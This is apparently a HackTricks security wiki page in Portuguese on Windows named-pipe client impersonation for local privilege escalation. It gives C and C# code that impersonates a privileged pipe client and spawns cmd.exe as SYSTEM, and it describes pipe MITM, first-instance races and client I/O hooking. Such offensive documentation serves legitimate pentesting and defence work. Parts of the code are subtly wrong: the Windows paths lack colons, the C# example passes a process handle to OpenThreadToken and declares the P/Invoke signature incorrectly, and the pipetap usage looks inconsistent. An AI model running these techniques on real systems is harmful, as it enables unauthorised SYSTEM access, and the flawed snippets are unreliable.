# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation é um primitive de local privilege escalation que permite que uma thread de um named-pipe server adote o security context de um client que se conecta a ela. Na prática, um atacante que consiga executar código com SeImpersonatePrivilege pode coagir um client privilegiado (por exemplo, um serviço SYSTEM) a se conectar a um pipe controlado pelo atacante, chamar ImpersonateNamedPipeClient, duplicar o token resultante em um primary token e iniciar um processo como o client (muitas vezes NT AUTHORITY\SYSTEM).

Esta página foca na técnica central. Para cadeias de exploit end-to-end que coagem SYSTEM para o seu pipe, veja as páginas da família Potato referenciadas abaixo.

## TL;DR
- Create a named pipe: \\.\pipe\<random> e aguarde uma conexão.
- Faça com que um componente privilegiado se conecte a ele (spooler/DCOM/EFSRPC/etc.).
- Leia pelo menos uma mensagem do pipe e então chame ImpersonateNamedPipeClient.
- Abra o impersonation token da thread atual, DuplicateTokenEx(TokenPrimary), e use CreateProcessWithTokenW/CreateProcessAsUser para obter um processo SYSTEM.

## Requirements and key APIs
- Privilégios normalmente necessários para o processo/thread que chama:
- SeImpersonatePrivilege para impersonar com sucesso um client que se conecta e para usar CreateProcessWithTokenW.
- Alternativamente, após impersonar SYSTEM, você pode usar CreateProcessAsUser, que pode exigir SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (estes são satisfeitos quando você está impersonando SYSTEM).
- Core APIs usadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (deve ler pelo menos uma mensagem antes da impersonation)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Impersonation level: para realizar ações úteis localmente, o client deve permitir SecurityImpersonation (padrão para muitos clients locais de RPC/named-pipe). Clients podem reduzir isso com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ao abrir o pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Se ImpersonateNamedPipeClient retornar ERROR_CANNOT_IMPERSONATE (1368), certifique-se de ler da pipe primeiro e de que o client não restringiu a impersonation ao nível Identification.
- Prefira DuplicateTokenEx com SecurityImpersonation e TokenPrimary para criar um token primário adequado para criação de processo.

## .NET quick example
Em .NET, NamedPipeServerStream pode impersonate via RunAsClient. Uma vez em impersonation, duplique o thread token e crie um processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Triggers/coercions comuns para fazer o SYSTEM chegar ao seu pipe
Essas técnicas forçam serviços privilegiados a se conectar ao seu named pipe para que você possa impersoná-los:
- Print Spooler RPC trigger (PrintSpoofer)
- variantes de ativação DCOM/reflexão NTLM (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Veja o uso detalhado e a compatibilidade aqui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se você só precisa de um exemplo completo de como criar o pipe e impersonar para spawnar SYSTEM a partir de um service trigger, veja:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abuse de Named Pipe IPC & MITM (ACLs, First-Instance Races, Client Hooking)

Quando um serviço privilegiado e um processo com baixo privilégio se comunicam por `\\.\pipe\...`, trate o pipe como qualquer outra boundary IPC não confiável. Além da impersonation clássica do lado do servidor, ACLs fracas no pipe, flags de criação inseguras e decisões de confiança do lado do client também podem virar primitivas de local privilege escalation.

### Enumere primeiro os pipes candidatos
- Liste pipes rapidamente no PowerShell: `Get-ChildItem \\.\pipe\`
- `pipelist64.exe` da Sysinternals é útil para identificar contagens de instâncias e pipes de única instância.
- Priorize nomes usados por services executados como `SYSTEM`, especialmente helpers, updaters, launchers e UI brokers.

### MITM via DACLs permissivas e instâncias extras do pipe
- Qualquer processo que consegue falar com um servidor privilegiado já pode fazer fuzz no protocolo e procurar comandos privilegiados.
- O caso mais interessante é quando a DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` no objeto do pipe. Em named pipes isso inclui implicitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` compartilha o mesmo bit), então um attacker pode criar outra instância de server com o mesmo nome.
- Como as instâncias são casadas em ordem FIFO, instâncias criadas pelo attacker e instâncias legítimas podem ser intercaladas: crie uma instância rogue com `CreateNamedPipe`, depois abra o mesmo nome de pipe com `CreateFile`, e espere um client real cair na instância rogue do server.
- Resultado: observe, modifique, relaye ou desynchronize IPC privilegiado sem precisar controlar o processo original do server.

### First-instance race em security descriptors do pipe
- `lpSecurityAttributes` só define a DACL quando a primeira instância de um nome de pipe é criada.
- Se um serviço privilegiado iniciar tarde e não usar `FILE_FLAG_FIRST_PIPE_INSTANCE`, um attacker pode pré-criar o nome do pipe com uma DACL permissiva e depois deixar o service criar instâncias posteriores sob o security context escolhido pelo attacker.
- Isso transforma o startup do service em uma race condition: vença a primeira instância, depois conecte ou faça MITM de clients posteriores usando a ACL enfraquecida.
- Mitigação para defenders, e um ponto-chave de revisão para attackers: verifique se `CreateNamedPipe(..., dwOpenMode, ...)` inclui `FILE_FLAG_FIRST_PIPE_INSTANCE`. Se não incluir, teste a pré-criação antes de o service iniciar.

### Checagens de PID/signature são hardening, não uma boundary
- Alguns produtos tentam restringir o acesso verificando `GetNamedPipeClientProcessId`, o caminho da imagem do processo ou o assinante Authenticode do client que está se conectando.
- Isso só ajuda até você injetar no client legítimo: uma vez dentro do processo confiável, você herda exatamente o contexto de PID/imagem/signature que o server espera.
- Para desktop apps divididos, instrumentar o processo de UI/helper com baixo privilégio costuma ser mais fácil do que atacar diretamente o service `SYSTEM`.

### Hook o client de acordo com seu modelo de I/O
- I/O síncrono: intercepte `NtWriteFile` antes que o syscall consuma o buffer e inspecione/patch `NtReadFile` depois que ele retornar.
- I/O overlapped: armazene o `OVERLAPPED`/`IoStatusBlock` visto em `NtReadFile` e então inspecione o buffer após `GetOverlappedResult` ou a wait relevante completar.
- Completion ports: `GetQueuedCompletionStatus` alcança `NtRemoveIoCompletion`; o `ApcContext` retornado se liga de volta ao `OVERLAPPED` usado pela leitura original, que é o pivot correto para encontrar o buffer agora populado.
- Completion routines (`ReadFileEx`): a callback de completion é entregue como uma APC. Se você quiser adulterar dados retornados ou injetar respostas sintéticas, hook a real completion routine e, para injeção customizada, use um dispatcher `QueueUserAPC` de um argumento que reconstrua os 3 argumentos esperados da rotina.

### Notas de tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) faz proxy do tráfego de named-pipe através de uma DLL helper injetada e expõe um workflow estilo Burp para edição/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adota uma abordagem baseada em Frida e foca em hook de `NtReadFile`/`NtWriteFile` além dos pivots assíncronos/de completion acima, encaminhando o tráfego para um workflow de edição apoiado por WebSocket.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considerações operacionais
- Named pipes têm baixa latência; pausas longas ao editar buffers podem travar serviços frágeis.
- Clientes baseados em overlapped/completion-port/APC precisam de hooks diferentes de simples detours de `ReadFile`/`WriteFile`.
- A injeção no cliente confiável é barulhenta e, em geral, deve ser mantida para exploit development, protocol reversing ou fuzzing em laboratório local.

## Troubleshooting and gotchas
- Você deve ler pelo menos uma mensagem do pipe antes de chamar ImpersonateNamedPipeClient; caso contrário, você receberá ERROR_CANNOT_IMPERSONATE (1368).
- Se o cliente se conectar com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, o servidor não pode impersonar totalmente; verifique o nível de impersonation do token via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requer SeImpersonatePrivilege no chamador. Se isso falhar com ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser depois de já ter impersonado SYSTEM.
- Garanta que o security descriptor do seu pipe permita que o serviço alvo se conecte se você o endurecer; por padrão, pipes em \\.\pipe são acessíveis de acordo com o DACL do servidor.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
